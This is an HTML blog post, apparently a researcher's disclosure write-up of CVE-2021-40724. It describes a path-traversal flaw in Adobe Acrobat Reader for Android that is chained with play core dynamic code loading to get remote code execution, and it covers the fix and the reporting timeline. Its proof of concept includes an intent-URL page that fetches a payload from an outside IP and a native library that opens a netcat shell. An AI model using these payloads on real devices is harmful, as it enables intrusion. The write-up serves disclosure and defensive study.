@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html
+  dir="ltr"
+  lang="en"
+  data-theme=""
+><head>
+  <title>
+    
+      Sunny Gupta
+        |
+        RCE in Adobe Acrobat Reader for android(CVE-2021-40724)
+
+
+      
+
+
+    
+  </title>
+
+  
+  <meta charset="utf-8" /><meta name="generator" content="Hugo 0.91.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <meta
+    name="description"
+    content="
+      
+
+
+    "
+  />
+  
+  
+  
+  <link
+    rel="stylesheet"
+    href="/css/main.min.24f9f28bfaca2cdc5a222bb5e42d30c701d7ffb0b31d30dfc4afc0e044dfbf24.css"
+    integrity="sha256-JPnyi/rKLNxaIiu15C0wxwHX/7CzHTDfxK/A4ETfvyQ="
+    crossorigin="anonymous"
+    type="text/css"
+  />
+  
+  
+  <link
+    rel="stylesheet"
+    href="/css/markupHighlight.min.058b31f17db60602cc415fd63b0427e7932fbf35c70d8e341a4c39385f5f6f3e.css"
+    integrity="sha256-BYsx8X22BgLMQV/WOwQn55MvvzXHDY40Gkw5OF9fbz4="
+    crossorigin="anonymous"
+    type="text/css"
+  />
+  
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
+    integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA=="
+    crossorigin="anonymous"
+  />
+  
+  <link rel="shortcut icon" href="/favicons/favicon.ico" type="image/x-icon" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png" />
+
+  <link rel="canonical" href="http://hulkvision.gitlab.io/blog/post1/" />
+
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/anatole-header.min.2a2cd9614b7d007dfbb75e8da19e3a0fa872ceab53c6d000c00b7a0c89b85bfc.js"
+    integrity="sha256-KizZYUt9AH37t16NoZ46D6hyzqtTxtAAwAt6DIm4W/w="
+    crossorigin="anonymous"
+  ></script>
+
+  
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/anatole-theme-switcher.min.7fd87181cdd7e8413aa64b6867bb32f3a8dc242e684fc7d5bbb9f600dbc2b6eb.js"
+      integrity="sha256-f9hxgc3X6EE6pktoZ7sy86jcJC5oT8fVu7n2ANvCtus="
+      crossorigin="anonymous"
+    ></script>
+
+  
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://hulkvision.gitlab.io/featured-image.png"/>
+
+<meta name="twitter:title" content="RCE in Adobe Acrobat Reader for android(CVE-2021-40724)"/>
+<meta name="twitter:description" content="# Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path transversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path transversal bug and dynamic code loading,i was able to acheive remote code execution."/>
+
+
+
+  
+
+
+  
+  
+  
+  
+  <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "articleSection": "blog",
+        "name": "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)",
+        "headline": "RCE in Adobe Acrobat Reader for android(CVE-2021-40724)",
+        "alternativeHeadline": "",
+        "description": "
+      
+        # Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http\/https url. This feature was vulnerable to path transversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path transversal bug and dynamic code loading,i was able to acheive remote code execution.
+
+
+      
+
+
+    ",
+        "inLanguage": "en",
+        "isFamilyFriendly": "true",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/hulkvision.gitlab.io\/blog\/post1\/"
+        },
+        "author" : {
+            "@type": "Person",
+            "name": "Sunny Gupta"
+        },
+        "creator" : {
+            "@type": "Person",
+            "name": "Sunny Gupta"
+        },
+        "accountablePerson" : {
+            "@type": "Person",
+            "name": "Sunny Gupta"
+        },
+        "copyrightHolder" : {
+            "@type": "Person",
+            "name": "Sunny Gupta"
+        },
+        "copyrightYear" : "2022",
+        "dateCreated": "2022-01-14T11:16:51.00Z",
+        "datePublished": "2022-01-14T11:16:51.00Z",
+        "dateModified": "2022-01-14T11:16:51.00Z",
+        "publisher":{
+            "@type":"Organization",
+            "name": "Sunny Gupta",
+            "url": "http://hulkvision.gitlab.io",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "http:\/\/hulkvision.gitlab.io\/favicons\/favicon-32x32.png",
+                "width":"32",
+                "height":"32"
+            }
+        },
+        "image": 
+      [
+        
+        "http://hulkvision.gitlab.io/featured-image.png"
+
+
+      
+      ]
+
+    ,
+        "url" : "http:\/\/hulkvision.gitlab.io\/blog\/post1\/",
+        "wordCount" : "873",
+        "genre" : [ ],
+        "keywords" : [ ]
+    }
+  </script>
+
+
+
+</head>
+<body>
+    <header><div
+  class="page-top 
+    animated fadeInDown
+
+  "
+>
+  <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
+    <span aria-hidden="true"></span>
+    <span aria-hidden="true"></span>
+    <span aria-hidden="true"></span>
+  </a>
+  <nav>
+    <ul class="nav__list" id="navMenu">
+      <div class="nav__links">
+        
+        
+          
+          <li>
+            <a
+              
+              href="/"
+              
+              title=""
+              >Home</a
+            >
+          </li>
+
+        
+          
+          <li>
+            <a
+              
+              href="/blog"
+              
+              title=""
+              >Archives</a
+            >
+          </li>
+
+        
+          
+          <li>
+            <a
+              
+              href="/about"
+              
+              title=""
+              >About</a
+            >
+          </li>
+
+        
+      </div>
+      <ul>
+        
+        
+          <li>
+            <a class="theme-switch" title="Switch Theme">
+              <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a>
+          </li>
+
+        
+      </ul>
+    </ul>
+  </nav>
+</div>
+</header>
+    <div class="wrapper">
+      <aside><div
+  class="sidebar
+    animated fadeInDown
+
+  "
+>
+  <div class="sidebar__content">
+    <div class="logo-title">
+      <div class="title">
+        <img src="/profile.png" alt="profile picture" />
+        <h3 title=""><a href="/">Hi! I&#39;m Sunny 👋Welcome!</a></h3>
+        <div class="description">
+          <p></p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+      
+        <li>
+          <a href="https://twitter.com/hulkvision" rel="me" aria-label="Twitter" title="Twitter">
+            <i class="fab fa-twitter fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/hulkvision/" rel="me" aria-label="Linkedin" title="Linkedin">
+            <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="mailto:hulkvision@protonmail.com" rel="me" aria-label="e-mail" title="e-mail">
+            <i class="fas fa-envelope fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+    </ul>
+  </div><footer class="footer footer--sidebar">
+  <div class="by_farbox">
+    <ul class="footer__list">
+      <li class="footer__item">
+        &copy;
+        
+          2022
+
+        
+      </li>
+      
+    </ul>
+  </div>
+</footer>
+  
+  <script
+    type="text/javascript"
+    src="/js/medium-zoom.min.71100d84fab0ad794b8399a66ac810700cc78d703f715dc10af4d7ba7b761362.js"
+    integrity="sha256-cRANhPqwrXlLg5mmasgQcAzHjXA/cV3BCvTXunt2E2I="
+    crossorigin="anonymous"
+  ></script></div>
+</aside>
+      <main>
+        <div class="autopagerize_page_element">
+          <div class="content">
+  <div
+    class="post 
+      animated fadeInDown
+
+    "
+  >
+    <div class="post-content">
+      
+      <div class="post-title">
+        <h1>RCE in Adobe Acrobat Reader for android(CVE-2021-40724)</h1>
+        
+          <div class="info">
+            <em class="fas fa-calendar-day"></em>
+            <span class="date"
+              >
+                Fri, Jan 14, 2022
+
+
+              </span
+            >
+            <em class="fas fa-stopwatch"></em>
+            <span class="reading-time">5-minute read</span>
+          </div>
+
+        
+      </div><h2 id="-summary"># Summary</h2>
+<p>While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path transversal vulnerability.
+Abode reader was also using Google play core library for dynamic code loading. using path transversal bug and dynamic code loading,i was able to acheive remote code execution.</p>
+<h2 id="-finding-path-transversal-vulnerability"># Finding Path transversal vulnerability</h2>
+<pre tabindex="0"><code>        &lt;activity android:theme=&quot;@style/Theme_Virgo_SplashScreen&quot; android:name=&quot;com.adobe.reader.AdobeReader&quot; android:exported=&quot;true&quot; android:launchMode=&quot;singleTask&quot; android:screenOrientation=&quot;user&quot; android:configChanges=&quot;keyboardHidden|screenLayout|screenSize|smallestScreenSize&quot; android:noHistory=&quot;false&quot; android:resizeableActivity=&quot;true&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.EDIT&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;
+                &lt;data android:scheme=&quot;file&quot;/&gt;
+                &lt;data android:scheme=&quot;content&quot;/&gt;
+                &lt;data android:scheme=&quot;http&quot;/&gt;
+                &lt;data android:scheme=&quot;https&quot;/&gt;
+                &lt;data android:mimeType=&quot;application/pdf&quot;/&gt;
+            &lt;/intent-filter&gt;
+</code></pre><p>There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be <code>application/pdf</code> for this actiivity.</p>
+<p>When an intent with data url for example <code>http://localhost/test.pdf</code>  is sent to adobe reader app,it downloads the file in <code>/sdcard/Downloads/Adobe Acrobat</code> folder with filename as LastPathSegment(i.e <code>test.pdf</code>) of the sent url.</p>
+<p>Activity <code>com.adobe.reader.AdobeReader</code> receives the intent and starts <code>ARFileURLDownloadActivity</code> activity.</p>
+<pre tabindex="0"><code>public void handleIntent() {
+            Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class);
+            intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData());
+            intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType());
+            startActivity(intent2);
+    }
+</code></pre><p>This activity <code>ARFileURLDownloadActivity</code>starts <code>com.adobe.reader.misc.ARFileURLDownloadService</code> service.</p>
+<pre tabindex="0"><code>public void onMAMCreate(Bundle bundle) {
+        super.onMAMCreate(bundle);
+        this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class);
+        Bundle bundle2 = new Bundle();
+        //...//
+        this.mServiceIntent.putExtras(bundle2);
+        startService();
+    }
+</code></pre><p>In <code>com.adobe.reader.misc.ARFileURLDownloadService.java</code></p>
+<pre tabindex="0"><code>public int onMAMStartCommand(Intent intent, int i, int i2) { 
+        Bundle extras = intent.getExtras();
+        //..//
+        String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null);
+        ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string);
+        this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask;
+        aRURLFileDownloadAsyncTask.taskExecute(new Void[0]);
+        return 2;
+    }
+</code></pre><p>In <code>com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java</code></p>
+<pre tabindex="0"><code>    private void downloadFile() throws IOException, SVFileDownloadException {
+        Exception exc;
+        boolean z;
+        Throwable th;
+        boolean z2;
+        Uri fileURI = this.mDownloadModel.getFileURI();
+        URL url = new URL(fileURI.toString());
+        try {
+            String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() {
+               ARFileFromURLDownloader.DownloadUrlListener
+                public void onProgressUpdate(int i, int i2) {
+                    ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2);
+                }
+
+                @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener
+                public boolean shouldCancelDownload() {
+                    return ARURLFileDownloadAsyncTask.this.isCancelled();
+                }
+            }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url);
+            //...//
+</code></pre><p>This method <code>BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData</code> takes this.mUri.getLastPathSegment() as argument and which returns the decoded  last segment in the path of the url.</p>
+<p>For example let take this url <code>https://localhost/x/..%2F..%2Ffile.pdf</code> so when this url is passed to getLastPathSegment() method it will take <code>..%2F..%2Ffile.pdf</code> as last segment of the url and will return <code>../../file.pdf</code> as output.</p>
+<p>There was not any sanitization performed in <code>downloadFile</code> variable before passing it into  File instance which resulted into path transversal vulnerability.</p>
+<h2 id="-getting-rce"># Getting RCE</h2>
+<p>Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.</p>
+<p>A simple way to know whether an app is using play core library for dynamic code loading is to check for <code>spiltcompat</code> directory in <code>/data/data/:application_id/files/</code> directory.</p>
+<p>Using path transversal bug i can write an arbitrary apk in <code>/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/</code> directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this <a href="https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/">article</a></p>
+<p>Adobe reader app also downloads an module name <code>FASOpenCVDF.apk</code> during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path transversal vulnerability i  could not write over existing files&hellip; only create new files.</p>
+<p>I was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from  <code>/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/</code> directory.</p>
+<p><code>FASOpenCVDF.apk</code> module was also loading an native library from
+<code>/data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a</code> directory. I decided to take a look into <code>FASOpenCVDF.apk</code> source code and there i founded this module is also trying to load three unavailable libraries <code>libADCComponent.so</code>,<code>libColoradoMobile.so</code> and <code>libopencv_info.so </code> and this solved my issue of executing code remotely.</p>
+<p>I created a simple poc native library , renamed it to <code>libopencv_info.so</code> and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.</p>
+<h2 id="-proof-of-concept"># Proof of Concept</h2>
+<pre tabindex="0"><code>&lt;html&gt;
+&lt;title&gt; RCE in Adobe Acrobat Reader for android &lt;/title&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        window.location.href=&quot;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end&quot;;
+    &lt;/script&gt;    
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre tabindex="0"><code>#include &lt;jni.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+
+JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
+
+    if (fork() == 0) {
+        system(&quot;toybox nc -p 6666 -L /system/bin/sh -l&quot;);
+    }
+    JNIEnv* env;
+    if (vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) {
+        return JNI_ERR;
+    }
+    return JNI_VERSION_1_6;
+}
+</code></pre><h3 id="-vulnerability-fix-"># Vulnerability Fix !</h3>
+<p>In <code>com.adobe.libs.buildingblocks.utils.BBIntentUtils.java</code></p>
+<pre tabindex="0"><code>private static final String FILE_NAME_RESERVED_CHARACTER = &quot;[*/\\|?&lt;&gt;\&quot;]&quot;;
+public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) {
+        if (TextUtils.isEmpty(str)) {
+            str = BBConstants.DOWNLOAD_FILE_NAME;
+        }
+        String str3 = null;
+        if (!(contentResolver == null || uri == null)) {
+            str3 = MAMContentResolverManagement.getType(contentResolver, uri);
+        }
+        String str4 = !TextUtils.isEmpty(str3) ? str3 : str2;
+        if (!TextUtils.isEmpty(str4)) {
+            String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4);
+            if (!TextUtils.isEmpty(fileExtensionFromMimeType)) {
+                if (str.lastIndexOf(46) == -1) {
+                    str = str + '.' + fileExtensionFromMimeType;
+                } else {
+                    String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str);
+                    if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) &amp;&amp; !TextUtils.equals(mimeTypeForFile, str2))) {
+                        str = str + '.' + fileExtensionFromMimeType;
+                    }
+                }
+            }
+        }
+        return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, &quot;_&quot;);
+    }
+</code></pre><p>Have a nice day! and if you got any doubt you can contact me on Twitter.</p>
+<h4 id="timeline">Timeline</h4>
+<ul>
+<li>Jul 29th,2021 - Reported the vulnerability to adobe</li>
+<li>Aug 4th ,2021 - report traiged</li>
+<li>Oct 13th,2021 - Vulnerability Fixed</li>
+<li>Dec 4th ,2021 - $10000 bounty awarded from GPSRP</li>
+</ul>
+</div>
+    <div class="post-footer">
+      <div class="info">
+        
+
+        
+      </div>
+    </div>
+
+    
+  </div>
+
+
+          </div>
+        </div>
+      </main>
+    </div><footer class="footer footer--base">
+  <div class="by_farbox">
+    <ul class="footer__list">
+      <li class="footer__item">
+        &copy;
+        
+          2022
+
+        
+      </li>
+      
+    </ul>
+  </div>
+</footer>
+  
+  <script
+    type="text/javascript"
+    src="/js/medium-zoom.min.71100d84fab0ad794b8399a66ac810700cc78d703f715dc10af4d7ba7b761362.js"
+    integrity="sha256-cRANhPqwrXlLg5mmasgQcAzHjXA/cV3BCvTXunt2E2I="
+    crossorigin="anonymous"
+  ></script></body>
+</html>
